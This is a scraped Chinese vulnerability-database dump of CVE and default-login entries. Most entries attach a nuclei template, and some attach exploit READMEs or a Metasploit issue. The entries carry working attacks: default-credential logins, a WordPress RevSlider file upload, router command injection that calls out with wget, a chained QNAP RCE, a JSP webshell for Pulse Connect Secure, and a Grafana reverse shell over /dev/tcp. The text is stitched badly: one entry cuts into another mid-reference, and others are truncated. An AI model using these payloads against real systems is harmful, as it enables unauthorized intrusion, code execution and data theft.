posts.text: 漏洞信息漏洞名称： Rocket LMS 默认登录凭证漏洞 漏洞类型： 弱口令 漏洞等级： 高危 漏洞描述： Rocket LMS 存在默认登录凭证漏洞，攻击者可以利用默认凭证如admin@demo.com/admin等登录系统。 产品厂商： rocketsoft 产品名称： Rocket LMS 搜索语法： html:”Rocket LMS” 来源： https://github.com/projectdiscovery/nuclei-templates/blob/94ff0c4c6a2630c45608208c30c5b4ff1130ad04/http%2Fdefault-logins%2Frocketlms%2Frocketlms-default-login.yaml 类型： projectdiscovery/nuclei-templates:github issues POC详情12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273id: rocketlms-default-logininfo: name: Rocket LMS - Default Login author: hamad501 severity: high description: | Rocket LMS default credentials were discovered. reference: - https://codecanyon.net/item/rocket-lms-learning-management-academy-script/33120735 - https://github.com/Yucaerin/RocketLms - https://medium.com/@naxtarrr/rocket-lms-shell-upload-vulnerability-c400665702f3 metadata: verified: true max-request: 4 vendor: rocketsoft product: rocket-lms shodan-query: html:"Rocket LMS" tags: default-login,lms,rocketlmshttp: - raw: - | GET /login HTTP/1.1 Host: {{Hostname}} Origin: {{RootURL}} Referer: {{RootURL}}/login - | POST /login HTTP/1.1 Host: {{Hostname}} Origin: {{RootURL}} Referer: {{RootURL}}/login Content-Type: application/x-www-form-urlencoded _token={{token}}&type=email&email={{username}}&country_code=&mobile=&password={{password}} attack: pitchfork payloads: username: - admin@demo.com - student@demo.com - instructor@demo.com password: - admin - student - instructor max-redirects: 2 stop-at-first-match: true matchers-condition: and matchers: - type: word part: body words: - "/panel" - type: status status: - 302 extractors: - type: regex part: body name: token internal: true group: 1 regex: - 'name="_token"\s+value="([^"]+)"'

posts.title: WordPress RevSlider - Remote Code Execution via File Upload
posts.text: 漏洞信息漏洞名称： WordPress RevSlider - Remote Code Execution via File Upload 漏洞编号： CVE： CVE-2014-9735 漏洞类型： 文件上传 漏洞等级： 高危 漏洞描述： WordPress的ThemePunch Slider Revolution (revslider)插件在3.0.96之前版本及Showbiz Pro插件1.7.1及之前版本中，未能适当限制对管理员AJAX功能的访问，远程攻击者可通过update_plugin操作上传并执行任意文件，通过delete_slider操作删除任意滑块，以及通过未指定向量创建、更新、导入或导出任意滑块。 产品厂商： themepunch 产品名称： ThemePunch Slider Revolution (revslider) plugin for WordPress 影响版本： before 3.0.96 来源： https://github.com/projectdiscovery/nuclei-templates/blob/26b4a86f194d049397f0a231469ca81addb9f4dc/http%2Fcves%2F2014%2FCVE-2014-9735.yaml 类型： projectdiscovery/nuclei-templates:github issues POC详情1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980id: CVE-2014-9735info: name: WordPress RevSlider - Remote Code Execution via File Upload author: iamnoooob,pdresearch severity: high description: | The ThemePunch Slider Revolution (revslider) plugin before 3.0.96 for WordPress and Showbiz Pro plugin 1.7.1 and earlier for Wordpress does not properly restrict access to administrator AJAX functionality, which allows remote attackers to (1) upload and execute arbitrary files via an update_plugin action; (2) delete arbitrary sliders via a delete_slider action; and (3) create, (4) update, (5) import, or (6) export arbitrary sliders via unspecified vectors. reference: - https://whatisgon.wordpress.com/2014/11/30/another-revslider-vulnerability/ - https://nvd.nist.gov/vuln/detail/CVE-2014-9735 - https://www.exploit-db.com/exploits/35385 - https://wpvulndb.com/vulnerabilities/7954 - https://plugins.trac.wordpress.org/browser/patch-for-revolution-slider/trunk/revsliderpatch.php classification: cvss-metrics: CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P cvss-score: 7.5 cve-id: CVE-2014-9735 cwe-id: CWE-264 epss-score: 0.8105 epss-percentile: 0.99094 cpe: cpe:2.3:a:themepunch:showbiz_pro:*:*:*:*:*:wordpress:*:* metadata: vendor: themepunch product: showbiz_pro framework: wordpress tags: cve,cve2014,wordpress,revslider,fileupload,rce,plugin,wp,unauth,intrusivevariables: marker: "{{randstr}}" b64marker: "{{base64(marker)}}" filename: "{{rand_base(5)}}"flow: http(1) && http(2)http: - raw: - | POST /wp-admin/admin-ajax.php HTTP/1.1 Host: {{Hostname}} X-Requested-With: XMLHttpRequest Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryWJDMjlXCUnC1rnZg ------WebKitFormBoundaryWJDMjlXCUnC1rnZg Content-Disposition: form-data; name="action" revslider_ajax_action ------WebKitFormBoundaryWJDMjlXCUnC1rnZg Content-Disposition: form-data; name="client_action" update_plugin ------WebKitFormBoundaryWJDMjlXCUnC1rnZg Content-Disposition: form-data; name="update_file"; filename="{{filename}}.zip" Content-Type: application/zip {{zip('{{filename}}.php','<?php echo base64_decode(\'{{b64marker}}\'); ?>')}} ------WebKitFormBoundaryWJDMjlXCUnC1rnZg-- matchers: - type: dsl dsl: - 'contains_all(body, "Update in progress...","wp-admin/admin.php?page=revslider&view=sliders")' - 'status_code == 200' condition: and internal: true - raw: - | GET /wp-content/plugins/revslider/temp/update_extract/{{filename}}.php HTTP/1.1 Host: {{Hostname}} matchers: - type: dsl dsl: - 'contains(body, "{{marker}}")' - 'status_code == 200' condition: and

posts.title: Hewlett Packard LaserJet Printer 默认登录漏洞
posts.text: 漏洞信息漏洞名称： Hewlett Packard LaserJet Printer 默认登录漏洞 漏洞类型： 弱口令 漏洞等级： 高危 漏洞描述： HP打印机默认允许无需密码的管理员访问，这种行为使得任何人都可以无需认证就以管理员身份登录，可能暴露敏感设置或功能。 产品厂商： Hewlett Packard 产品名称： Hewlett Packard LaserJet Printer 搜索语法： html:”hp/device/SignIn/Index” 来源： https://github.com/projectdiscovery/nuclei-templates/blob/619abf1c5876542ed73505aed210350095229073/network%2Fdefault-login%2Fhp-printer%2Fhp-printer-default-login.yaml 类型： projectdiscovery/nuclei-templates:github issues POC详情123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263id: hp-printer-default-logininfo: name: Hewlett Packard LaserJet Printer - Default Login author: JohnAsbjorn severity: high description: | HP printers often allow administrative access without requiring a password by default. This behavior enables anyone to log in as the Administrator without authentication, potentially exposing sensitive settings or functions. reference: - https://h30434.www3.hp.com/t5/Printing-Errors-or-Lights-Stuck-Print-Jobs/What-is-the-user-name-and-password-in-Embedded-Web-Server/td-p/6165417 metadata: verified: true shodan-query: html:"hp/device/SignIn/Index" max-request: 2 tags: hp,printer,default-loginhttp: - raw: - | GET /hp/device/SignIn/Index HTTP/1.1 Host: {{Hostname}} Accept-Encoding: identity Accept-Language: en extractors: - type: regex name: token part: body group: 1 regex: - 'id="CSRFToken" name="CSRFToken" value="([^"]+)"' internal: true - raw: - | POST /hp/device/SignIn/Index HTTP/1.1 Host: {{Hostname}} Accept-Encoding: identity Content-Type: application/x-www-form-urlencoded Origin: {{RootURL}} Referer: {{RootURL}}/hp/device/SignIn/Index CSRFToken={{token}}&agentIdSelect=hp_EmbeddedPin_v1&PinDropDown=AdminItem&PasswordTextBox=&signInOk=Sign+In redirects: true max-redirects: 2 matchers-condition: or matchers: - type: word part: body words: - "User: Administrator" - "Sign out" condition: and - type: regex part: header regex: - 'Set-Cookie: .*session.*'

posts.title: Kentico Xperience XSS Vulnerability
posts.text: 漏洞信息漏洞名称： Kentico Xperience XSS Vulnerability 漏洞编号： CVE： CVE-2025-32370 漏洞类型： 跨站可执行脚本 漏洞等级： 高危 漏洞描述： Kentico Xperience 13.0.178之前的版本中存在跨站脚本(XSS)漏洞，由于对上传的SVG文件处理不当，允许执行恶意脚本。 产品厂商： Kentico 产品名称： Kentico Xperience 影响版本： version < 13.0.178 来源： https://github.com/projectdiscovery/nuclei-templates/blob/5c969d7a5f60a9ad21a82109d612b29b11ef970a/CVE-2025-32370.yaml 类型： projectdiscovery/nuclei-templates:github issues POC详情12345678910111213141516171819202122232425262728293031323334353637id: CVE-2025-32370info: name: Kentico Xperience XSS Vulnerability author: Gaurang severity: high description: | This template checks for an XSS vulnerability in Kentico Xperience versions before 13.0.178. The issue arises due to improper handling of uploaded SVG files, allowing malicious scripts to be executed. tags: xss,kentico reference: - https://github.com/xirtam2669/Kentico-Xperience-before-13.0.178---XSS-POC/http: - raw: - | POST /CMSModules/.../MultiFileUploader.ashx?Filename=exploit.zip&Complete=false HTTP/1.1 Host: {{Hostname}} Content-Type: application/octet-stream {{file "exploit.zip"}} matchers-condition: and matchers: - type: status status: - 200 - type: word words: - "Upload succeeded" extractors: - type: regex name: response_message part: body regex: - "(?i)(upload succeeded|success)"

posts.title: CVE-2025-6083
posts.text: 漏洞信息漏洞名称： CVE-2025-6083 漏洞编号： CVE： CVE-2025-6083 漏洞类型： 未授权访问 漏洞描述： 该漏洞允许攻击者无需认证即可访问目标系统，或通过Bearer Token和手动cookie进行认证后访问。 来源： https://github.com/Yuri08loveElaina/CVE_2025_6083 类型： CVE-2025:github search 仓库文件 Exploit.py README.md 来源概述 Nếu không cần xác thựcpython3 exploit6083.py –url https://ztna.target.com –search admin Dùng Bearer Token python3 exploit6083.py –url https://ztna.target.com –search admin –auth-token abcdef123456 Dùng cookie thủ côngpython3 exploit6083.py –url https://ztna.target.com –search admin –cookie “PHPSESSID=xyz; user=admin”

posts.title: Jan 任意文件上传漏洞
posts.text: 漏洞信息漏洞名称： Jan 任意文件上传漏洞 漏洞编号： CVE： CVE-2024-36858 漏洞类型： 文件上传 漏洞等级： 严重 漏洞描述： Jan v0.4.12中的/v1/app/writeFileSync接口存在任意文件上传漏洞，攻击者可以通过上传特制文件来执行任意代码。 产品厂商： homebrew 产品名称： jan 影响版本： 0.4.12 搜索语法： icon_hash=”-165268926” 来源： https://github.com/projectdiscovery/nuclei-templates/blob/16e87fb8b364b699b947c239eddd14d143deceba/http%2Fcves%2F2024%2FCVE-2024-36858.yaml 类型： projectdiscovery/nuclei-templates:github issues POC详情12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485id: CVE-2024-36858info: name: Jan v0.4.12 - Arbitrary File Upload author: pussycat0x severity: critical description: | An arbitrary file upload vulnerability in the /v1/app/writeFileSync interface of Jan v0.4.12 allows attackers to execute arbitrary code via uploading a crafted file. reference: - posts.text: 漏洞信息漏洞名称： Tenda AC15 AC1900 命令注入漏洞 漏洞编号： CVE： CVE-2020-10987 漏洞类型： 命令执行 漏洞等级： 严重 漏洞描述： Tenda AC15 AC1900版本15.03.05.19的goform/setUsbUnload端点允许远程攻击者通过deviceName POST参数执行任意系统命令。 产品厂商： Tenda 产品名称： Tenda AC15 AC1900 影响版本： 15.03.05.19 搜索语法： http.title:”tenda wifi” 来源： https://github.com/projectdiscovery/nuclei-templates/blob/b69909f763b29b62111b3a26fa8e75563d613041/http%2Fcves%2F2020%2FCVE-2020-10987.yaml 类型： projectdiscovery/nuclei-templates:github issues POC详情12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364id: CVE-2020-10987info: name: Tenda AC15 AC1900 version 15.03.05.19 - Command Injection author: pussycat0x severity: critical description: | The goform/setUsbUnload endpoint of Tenda AC15 AC1900 version 15.03.05.19 allows remote attackers to execute arbitrary system commands via the deviceName POST parameter. reference: - https://blog.securityevaluators.com/tenda-ac1900-vulnerabilities-discovered-and-exploited-e8e26aa0bc68 classification: cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H cvss-score: 9.8 cve-id: CVE-2020-10987 cwe-id: CWE-78 epss-score: 0.90188 epss-percentile: 0.99558 cpe: cpe:2.3:o:tenda:ac15_firmware:15.03.05.19:*:*:*:*:*:*:* metadata: shodan-query: http.title:"tenda wifi" max-request: 2 vendor: tenda product: ac15_firmware tags: cve,cve2020,tenda,rce,kev,unauthvariables: payload: "wget http://{{interactsh-url}}"flow: http(1) && http(2)http: - raw: - | GET / HTTP/1.1 Host: {{Hostname}} redirects: true matchers: - type: dsl dsl: - 'contains(body,"<title>Tenda WiFi")' - "contains(content_type, 'text/html')" - "status_code == 200" condition: and internal: true - raw: - | POST /goform/setUsbUnload HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Accept: */* deviceName=test`;{{payload}};` matchers: - type: word part: interactsh_protocol words: - "http"

posts.title: QNAP Photo Station 预认证远程代码执行漏洞
posts.text: 漏洞信息漏洞名称： QNAP Photo Station 预认证远程代码执行漏洞 漏洞编号： CVE： CVE-2019-7194 漏洞类型： 命令执行 漏洞等级： 严重 漏洞描述： QNAP Photo Station 6.0.3之前版本存在多个漏洞，当这些漏洞被串联利用时，可实现未经认证的远程代码执行（RCE）。其中包括一个涉及文件名或路径外部控制的缺陷，允许攻击者访问或修改敏感系统文件。QNAP强烈建议将Photo Station更新至最新可用版本以缓解这些风险。 产品厂商： QNAP 产品名称： Photo Station 影响版本： < 6.0.3 来源： https://github.com/projectdiscovery/nuclei-templates/blob/64e18796d41d91bb9f75015f91fbf5a885db090f/http%2Fcves%2F2019%2FCVE-2019-7194.yaml 类型： projectdiscovery/nuclei-templates:github issues POC详情123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125id: qnap-photostation-CVE-2019-7194-preauth-rceinfo: name: QNAP Photo Station < 6.0.3 pre-auth RCE author: x-stp severity: critical description: | QNAP Photo Station versions prior to 6.0.3 contain multiple vulnerabilities that, when chained together, enable unauthenticated remote code execution (RCE). This includes a flaw involving external control of file names or paths, allowing attackers to access or modify sensitive system files. To mitigate these risks, QNAP strongly recommends updating Photo Station to the latest available versions. reference: - https://medium.com/bugbountywriteup/qnap-pre-auth-root-rce-affecting-450k-devices-on-the-internet-d55488d28a05 classification: cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H cvss-score: 9.8 cve-id: CVE-2019-7192,CVE-2019-7193,CVE-2019-7194,CVE-2019-7195 cwe-id: CWE-78 tags: cve,cve2019,qnap,rce,photostation,unauth,injection,lfi,kev,pocvariables: command_payload: '%3C%3F%3d%60%24_POST%5Bx%5D%60%3f%3e%40s.tp' dropper_command: "x= echo $((0x2C06*1337))" dropper_filename: "{{to_lower(rand_text_alpha(6))}}"http: - method: POST path: - "{{BaseURL}}/photo/p/api/album.php" headers: Content-Type: application/x-www-form-urlencoded body: "a=setSlideshow&f=qsamplealbum" extractors: - type: regex name: album_id group: 1 internal: true regex: - "<output>([a-zA-Z0-9]+)</output>" - method: GET path: - "{{BaseURL}}/photo/slideshow.php?album={{album_id}}" extractors: - type: regex name: access_code group: 1 internal: true regex: - "encodeURIComponent\\('([A-Za-z0-9%]+)'\\)" - type: regex part: header name: phpsessid group: 1 internal: true regex: - "PHPSESSID=([a-z0-9]+);" - method: POST path: - "{{BaseURL}}/photo/p/api/video.php" headers: Content-Type: application/x-www-form-urlencoded Cookie: "PHPSESSID={{phpsessid}}" body: "a=caption&f=UMGObv&album={{album_id}}&ac={{access_code}}&filename=../../../../../share/Multimedia/.@__thumb/ps.app.token" extractors: - type: regex name: app_token internal: true group: 1 regex: - "([a-f0-9]{32})" - method: POST path: - "{{BaseURL}}/cgi-bin/authLogin.cgi" headers: Content-Type: "application/x-www-form-urlencoded" body: "app=PHOTO_STATION&auth=1&app_token={{app_token}}" extractors: - type: regex part: body name: nas_sid internal: true group: 1 regex: - '<authSid><!\[CDATA\[([a-z0-9]+)\]\]></authSid>' - method: POST path: - "{{BaseURL}}/cgi-bin/userConfig.cgi?sid={{nas_sid}}" headers: Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Cookie: "DESKTOP=1; WINDOW_MODE=1; NAS_SID={{nas_sid}}; PHPSESSID={{phpsessid}}" body: "func=addPersonalSmtp&provider_idx=0&sender={{command_payload}}&default=0&smtp_server=0.0.0.0&port=25&security=-1&email_account=a%40b.com&email_passwd=ac1db1tch3z" - method: POST path: - "{{BaseURL}}/photo/{{dropper_filename}}.php" headers: Content-Type: application/x-www-form-urlencoded # oh well.. use that cookie jar again here.. posts.title: Windows NTLM反射SMB漏洞
posts.text: 漏洞信息漏洞名称： Windows NTLM反射SMB漏洞 漏洞编号： CVE： CVE-2025-33073 漏洞类型： 权限绕过 漏洞等级： 高危 漏洞描述： CVE-2025-33073是一个影响Windows系统的NTLM反射SMB漏洞，攻击者可以利用此漏洞通过反射NTLM认证挑战来绕过认证，未经授权访问敏感数据或资源。此漏洞源于对认证请求的不当处理，允许攻击者将NTLM认证挑战反射回目标。该漏洞的严重性被评估为高危，影响多种Windows版本。此存储库提供了一个概念验证(PoC)利用代码，旨在教育和提高对此安全问题的认识。 产品厂商： Microsoft 产品名称： Windows 来源： https://github.com/joaozixx/CVE-2025-33073 类型： CVE-2025:github search 仓库文件 CVE-2025-33073.py README.md dnstool.py lib 来源概述CVE-2025-33073: PoC Exploit for NTLM Reflection SMB Flaw 🚨 Table of Contents Introduction Overview of the Vulnerability Exploit Details Installation Usage Download the Exploit Contributing License Acknowledgments IntroductionWelcome to the CVE-2025-33073 repository. This project provides a proof-of-concept (PoC) exploit for the NTLM reflection flaw in SMB. This vulnerability can allow an attacker to gain unauthorized access to sensitive information. The purpose of this repository is to educate and raise awareness about this security issue. Overview of the VulnerabilityThe NTLM reflection flaw in SMB is a serious security issue that affects various versions of Windows. Attackers can exploit this vulnerability to authenticate as any user, potentially gaining access to sensitive data or resources. This flaw arises from improper handling of authentication requests, allowing attackers to reflect NTLM authentication challenges back to the target. Key Points: Affected Systems: Various Windows versions Impact: Unauthorized access to resources Severity: High Understanding this vulnerability is crucial for system administrators and security professionals to protect their networks effectively. Exploit DetailsThe exploit targets the NTLM reflection flaw by leveraging specific characteristics of the SMB protocol. By sending crafted requests, the exploit can trigger the vulnerability, allowing an attacker to authenticate without proper credentials. Technical Breakdown: Protocol: SMB (Server Message Block) Vulnerability Type: NTLM Reflection Required Privileges: None This exploit serves as a demonstration of the vulnerability and is intended for educational purposes only. Use it responsibly and ethically. InstallationTo set up the exploit on your machine, follow these steps: Clone the Repository: 1git clone https://github.com/joaozixx/CVE-2025-33073.git Navigate to the Directory: 1cd CVE-2025-33073 Install Dependencies:Ensure you have the required dependencies installed. Use the following command: 1pip install -r requirements.txt UsageOnce the exploit is set up, you can use it to test for the NTLM reflection flaw. Follow these steps: Run the Exploit:Execute the script with the target IP address: 1python exploit.py <target_ip> Monitor the Output:The exploit will provide feedback on the success or failure of the attempt. Log Results:It’s essential to log the results for further analysis. Important Note:Use this exploit only in a controlled environment where you have permission to test. Unauthorized use may lead to legal consequences. Download the ExploitYou can download the latest version of the exploit from the Releases section. Please ensure you download the correct file and execute it in a safe environment. To view the releases, click the button below: ContributingContributions are welcome! If you would like to contribute to this project, please follow these steps: Fork the Repository: Click the “Fork” button at the top right corner of the page. Create a New Branch: 1git checkout -b feature/YourFeature Make Your Changes: Implement your changes and test them thoroughly. Commit Your Changes:1git commit -m "Add your message here" Push to Your Branch:1git push origin feature/YourFeature Create a Pull Request: Go to the original repository and click on “New Pull Request.” Thank you for considering contributing to this project! LicenseThis project is licensed under the MIT License. See the LICENSE file for more details. AcknowledgmentsWe would like to thank the security community for their ongoing efforts in identifying and addressing vulnerabilities. Special thanks to those who have contributed to the understanding of NTLM reflection flaws and their implications. For more information, visit the Releases section to download the latest files and updates. Feel free to reach out if you have any questions or need assistance with the exploit. Your feedback is valuable in improving this project.

posts.title: D-Link DIR820LA1_FW105B03 'ping_addr' - OS Command Injection
posts.text: 漏洞信息漏洞名称： D-Link DIR820LA1_FW105B03 ‘ping_addr’ - OS Command Injection 漏洞编号： CVE： CVE-2023-25280 漏洞类型： 命令执行 漏洞等级： 严重 漏洞描述： D-Link DIR820LA1_FW105B03存在操作系统命令注入漏洞，攻击者可以通过ping_addr参数向ping.ccp发送特制负载，从而将权限提升至root。 产品厂商： dlink 产品名称： dir820la1_firmware 影响版本： 105b03 来源： https://github.com/projectdiscovery/nuclei-templates/blob/4d647358dfb2f2d8f39261db74beb2fbe28db647/http%2Fcves%2F2023%2FCVE-2023-25280.yaml 类型： projectdiscovery/nuclei-templates:github issues POC详情1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465id: CVE-2023-25280info: name: D-Link DIR820LA1_FW105B03 'ping_addr' - OS Command Injection author: pussycat0x severity: critical description: | OS Command injection vulnerability in D-Link DIR820LA1_FW105B03 allows attackers to escalate privileges to root via a crafted payload with the ping_addr parameter to ping.ccp. reference: - https://github.com/migraine-sudo/D_Link_Vuln/tree/main/cmd%20Inject%20in%20pingV4Msg - https://www.dlink.com/en/security-bulletin/ classification: cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H cvss-score: 9.8 cve-id: CVE-2023-25280 cwe-id: CWE-78 epss-score: 0.8918 epss-percentile: 0.99502 cpe: cpe:2.3:o:dlink:dir820la1_firmware:105b03:*:*:*:*:*:*:* metadata: vendor: dlink product: dir820la1_firmware tags: cve,cve2023,rce,unauth,kev,dlinkvariables: payload: "wget http://{{interactsh-url}}"flow: http(1) && http(2)http: - raw: - | GET / HTTP/1.1 Host: {{Hostname}} matchers: - type: dsl dsl: - "status_code == 200" - "contains(body, 'D-LINK')" condition: and internal: true - raw: - | POST /ping.ccp HTTP/1.1 Host: {{Hostname}} Accept: application/xml, text/xml, */*; q=0.01 X-Requested-With: XMLHttpRequest Content-Type: application/x-www-form-urlencoded Origin: {{RootURL}} Referer: {{RootURL}}/lan.asp Cookie: hasLogin=1 ccp_act=pingV4Msg&ping_addr=%0a{{payload}}%0a matchers: - type: dsl dsl: - "contains(interactsh_protocol, 'http')" - "status_code == 200" condition: and

posts.title: Grafana 远程代码执行漏洞
posts.text: 漏洞信息漏洞名称： Grafana 远程代码执行漏洞 漏洞编号： CVE： CVE-2024-9264 漏洞类型： 命令执行 漏洞等级： 严重 漏洞描述： CVE-2024-9264是Grafana中的一个严重远程代码执行漏洞，通过SQL表达式和DuckDB利用。此漏洞允许攻击者在易受攻击的Grafana实例上执行任意代码。修复版本解决了原始PoC中的语法错误和write_file()函数的不正确使用问题，并成功通过shellfs扩展写入和执行反向shell。 产品厂商： Grafana 产品名称： Grafana 影响版本： 11.0.0 来源： https://github.com/Exerrdev/CVE-2024-9264-Fixed 类型： CVE-2024:github search 仓库文件 README.md fpoc.py 来源概述🛠️ CVE-2024-9264 - Fixed Grafana RCE ExploitThis is a fixed version of the proof-of-concept exploit for CVE-2024-9264, a critical remote code execution vulnerability in Grafana (via SQL expressions and DuckDB). 🔗 Original advisory: Grafana Security Release❌ Original PoC: Broken due to syntax errors and incorrect use of write_file()✅ This version works, tested on a vulnerable Grafana 11.0.0 instance. ✅ Fixes in this version ✅ Correctly uses writefile() instead of write_file() (DuckDB function) ✅ Proper shell payload using bash -i >& /dev/tcp/... ✅ Reverse shell written and executed successfully via shellfs extension 📦 Requirements Grafana instance with: DuckDB backend Ability to install shellfs from community A netcat listener on your attacker machine 🚀 Usage123456python3 fixed_poc_writefile.py \ --url http://target:3000 \ --username admin \ --password admin \ --reverse-ip <YOUR_IP> \ --reverse-port 4444 Then listen with: 1nc -lvnp 4444 ⚠️ Legal DisclaimerThis project is for educational purposes only.Do not use it against targets you do not have permission to test. ✍️ Author of this FixModified and validated by Exerr — original PoC by z3k0sec.

posts.title: Pulse Connect Secure Bypass LFI y Remote Code Execution Vulnerability
posts.text: 漏洞信息漏洞名称： Pulse Connect Secure Bypass LFI y Remote Code Execution Vulnerability 漏洞编号： CVE： CVE-2021-22893 漏洞类型： 目录遍历 漏洞等级： 严重 漏洞描述： Pulse Connect Secure 9.1R11.4及以下版本存在未认证的远程代码执行漏洞。攻击者可以利用路径遍历漏洞写入任意文件，通过上传webshell导致远程代码执行。此模板尝试在多个常见的web可访问路径中写入JSP webshell，然后执行’id’命令以确认远程代码执行。 产品厂商： Pulse Secure 产品名称： Pulse Connect Secure 影响版本： version <= 9.1R11.4 来源： https://github.com/projectdiscovery/nuclei-templates/blob/41485124568acfbbf861dd3a329f0848d5de3969/http%2Fcves%2F2021%2FCVE-2021-22893.yaml 类型： projectdiscovery/nuclei-templates:github issues POC详情12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879id: cve-2021-22893info: name: Pulse Connect Secure - Bypass LFI y Remote Code Execution (CVE-2021-22893) author: MammaniNelsonD (P4IM0N) severity: critical description: | Pulse Connect Secure 9.1R11.4 y versiones inferiores son vulnerables a una ejecuci├│n de c├│digo remota no autenticada. Un atacante puede aprovechar una vulnerabilidad de Path Traversal para escribir archivos arbitrarios, lo que conduce a RCE al cargar una webshell. Esta plantilla intenta escribir una webshell JSP en varias rutas comunes accesibles desde la web y luego ejecuta el comando 'id' para confirmar el RCE. reference: - https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44784 - https://nvd.nist.gov/vuln/detail/CVE-2021-22893 - https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-22893.yaml - https://attackerkb.com/topics/23p4wVqVad/cve-2021-22893/rapid7-analysis classification: cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H cvss-score: 9.8 cve-id: CVE-2021-22893 cwe-id: CWE-22 metadata: max-requests: 8 tags: cve,cve2021,pulse,rce,traversal,unauth,webshell,intrusiverequests: - raw: - | POST /dana-na/jam/get_file.cgi?pass=1&file_name=../../../../..{{web_path}}{{shell_name}}&v=2.4 HTTP/1.1 Host: {{Hostname}} User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Accept: */* Connection: close Content-Type: application/octet-stream Content-Length: {{len(webshell_body)}} {{webshell_body}} - | GET {{web_path}}{{shell_name}}?cmd=id HTTP/1.1 Host: {{Hostname}} User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Accept: */* Connection: close attack: clusterbomb payloads: web_path: - "/dana/html5acc/guacamole/ui/" - "/dana-na/help/" - "/dana-cached/help/" - "/dana/meeting/" shell_name: - "{{randstr}}.jsp" webshell_body: - '<%@page import="java.util.*,java.io.*"%><% if (request.getParameter("cmd") != null) { Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); DataInputStream dis = new DataInputStream(p.getInputStream()); String line; while ((line = dis.readLine()) != null) { out.println(line); } p.destroy(); }%>' stop-at-first-match: true req-condition: true matchers-condition: and matchers: - type: status part: header_1 status: - 200 - type: regex part: body_1 regex: - "uid=[0-9(].*gid=[0-9(].*" extractors: - type: regex part: body_1 group: 1 name: rce_output regex: - "(uid=.*)"

posts.title: PHP FPM 远程代码执行漏洞
posts.text: 漏洞信息漏洞名称： PHP FPM 远程代码执行漏洞 漏洞类型： 命令执行 漏洞等级： 高危 漏洞描述： 该漏洞存在于PHP FPM中，攻击者可以通过构造特定的请求，利用Metasploit框架中的exploit/multi/http/php_fpm_rce模块实现远程代码执行。由于新的PHP编码器”HEX”导致payload大小超出限制，使得该漏洞在当前Metasploit版本中不再有效。 产品厂商： PHP 产品名称： PHP FPM 影响版本： 7.2.19 来源： https://github.com/rapid7/metasploit-framework/issues/20310 类型： rapid7/metasploit-framework:github issues 来源概述Steps to reproduceHow’d you do it? Victim: PHP 7.2.19, on Nginx 1.14.2 with FPM Attacker: Metasploit Framework v6.4.45-dev, using module exploit/multi/http/php_fpm_rce -> Exploit worked reliable on older Metasploit versions Expected behaviorDefault settings, default target (PHP), default payload (meterpreter/reverse_tcp)During check phase, the max payload length is determined being 1760 bytesPayload gets sent and a meterpreter shell is opened Current behaviorDuring check phase, max payload length is determined being 1760 bytesThen payload is prepared and encoded via the new default PHP encoder “HEX”, which is larger (2270 bytes), making the exploit fail Metasploit versionv6.4.45-dev Additional InformationOutput: msf6 exploit(multi/http/php_fpm_rce) > run[*] Started reverse TCP handler on 10.11.14.240:4444[*] Sending baseline query…[*] Detecting QSL…[+] The target is probably vulnerable. Possible QSLs: [1765][*] Doing sanity check…[*] Detecting attack parameters…[+] Parameters found: QSL=1760, customh_length=31[+] Target is vulnerable![*] Performing attack using php.ini settings…[+] Success! Was able to execute a command by appending ‘which which’[*] Trying to cleanup /tmp/y…[+] Cleanup done![*] Sending payload…[-] Exploit aborted due to failure: unknown: QSL value too small to fit the command: QSL=1760, qsl_delta=0, prefix (size=2270)=W=php%20-r%20%22eval(hex2bin(%%22));%22%26[*] Exploit completed, but no session was created.

posts.title: Pulse Connect Secure 认证绕过漏洞
posts.text: 漏洞信息漏洞名称： Pulse Connect Secure 认证绕过漏洞 漏洞编号： CVE： CVE-2021-22893 漏洞类型： 权限绕过 漏洞等级： 严重 漏洞描述： Pulse Connect Secure 9.0R3/9.1R1及更高版本中的Windows文件共享浏览器和Pulse Secure协作功能存在认证绕过漏洞，允许未认证的攻击者执行远程任意代码，利用此漏洞需要访问易受攻击的功能。 产品厂商： Pulse Secure 产品名称： Pulse Connect Secure 影响版本： 9.0R3/9.1R1 and higher 搜索语法： http.title:”ivanti connect secure” 来源： https://github.com/projectdiscovery/nuclei-templates/issues/12129 类型： projectdiscovery/nuclei-templates:github issues 来源概述Description: Pulse Connect Secure 9.0R3/9.1R1 and higher contains an authentication bypass caused by vulnerabilities in Windows File Share Browser and Pulse Secure Collaboration features, letting unauthenticated attackers perform remote arbitrary code execution, exploit requires access to vulnerable features. Severity: CriticalPOC: https://github.com/orangmuda/CVE-2021-22893 https://github.com/MRLEE123456/CVE-2021-22893 https://github.com/ZephrFish/CVE-2021-22893_HoneyPoC2 KEV: TrueShodan Query: http.title:"ivanti connect secure"

posts.title: QNAP Photo Station 未授权远程代码执行漏洞
